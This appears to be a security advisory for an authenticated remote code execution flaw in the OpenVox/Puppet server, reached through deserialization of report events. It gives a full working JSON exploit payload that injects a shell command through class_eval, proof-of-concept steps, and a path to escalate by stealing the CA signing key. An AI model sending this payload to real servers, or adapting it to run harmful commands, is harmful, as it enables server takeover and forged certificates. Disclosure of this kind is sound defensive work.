summary: Authenticated RCE on OpenVox server via Event Deserialization
description:
### Summary

Authenticated attackers with a OpenVox / Puppet client certificate can cause remote code execution on the OpenVox / Puppet server via a Ruby deserialize vulnerability.

### Details

OpenVox / Puppet agents can report “events” to the puppet server via the PUT `/puppet/v3/report` endpoint. The JSON encoded event will flow into the `Puppet::Pops::Serialization::FromDataConverter.convert` method located in [puppet/transaction/event.rb](https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/transaction/event.rb#L70-L73). The deserialize will then use [type = Types::TypeParser.singleton.parse(type_value, @loader)](https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/pops/serialization/from_data_converter.rb#L135) to read the `__ptype` and calls `.create(value)` on the attacker provided type. Eventually, [RubyGenerator.new.create_class(self)](https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/pops/types/p_object_type.rb#L557) is called, where  [cls.class_eval(class_def)](https://github.com/OpenVoxProject/openvox/blob/a80dfc2c8ea83a76908ca8b99507dfa18a09f01a/lib/puppet/pops/types/ruby_generator.rb#L66) gives direct code execution on the openvox-server. The following full JSON event can be used to trigger the code execution:

```json
{
  "host": "verify-ctrl-node.example.test",
  "time": "2026-09-01T22:30:00.000000000+00:00",
  "configuration_version": 1,
  "transaction_uuid": "00000000-0000-0000-0000-0000000000aa",
  "report_format": 12,
  "puppet_version": "8.20.0",
  "status": "changed",
  "transaction_completed": true,
  "noop": false,
  "noop_pending": false,
  "environment": "production",
  "corrective_change": false,
  "logs": [],
  "metrics": {},
  "resource_statuses": {
    "Notify[x]": {
      "resource": "Notify[x]",
      "title": "x",
      "resource_type": "Notify",
      "provider_used": null,
      "containment_path": [
        "Stage[main]"
      ],
      "file": null,
      "line": null,
      "evaluation_time": 0.001,
      "change_count": 1,
      "out_of_sync_count": 1,
      "tags": [
        "notify"
      ],
      "time": "2026-09-01T22:30:00.000000000+00:00",
      "out_of_sync": true,
      "changed": true,
      "skipped": false,
      "failed": false,
      "corrective_change": false,
      "events": [
        {
          "__ptype": "Object[{name => 'PEP', functions => {'test' => {type => Callable, annotations => {RubyMethod => {'body' => \"1\\n end\\n `/bin/sh -c 'touch /tmp/pwned'`\\n def d2\\n 1\"}}}}}]",
          "__pvalue": "x"
        }
      ]
    }
  }
}
```

The above event will execute `touch /tmp/pwned` as the `puppet` user on the host or container the OpenVox / Puppet server is running. The backticks in the payload make it trigger during compile/eval time. In configuration with autosign (which is common for enterprise deployment), this is an unauthenticated attack chain to compromise the OpenVox / Puppet server, as a valid cert can be requested via the OpenVox / Puppet client enrollment endpoint. Code execution as `puppet` gives access to the CA signing key. This allows the attacker to sign a certificates with EKU critical, serverAuth, clientAuth, which could enable direct command execution on other hosts if certain kinds of orchestration is configured.

### Proof of concept

* Send the above JSON event with a valid client certificate authentication to PUT `/puppet/v3/report`
* Observe the execution of `touch /tmp/pwned` and the creation of the `/tmp/pwned` as puppet user

### Impact

Code execution on an openvox-server

### Related

This vulnerability also affects Puppet Enterprise, including impacts to other integrated components.
- `CVE-2026-115731 – Report Deserialization Code Execution – CVSS 4.0: 9.4 (Critical)`
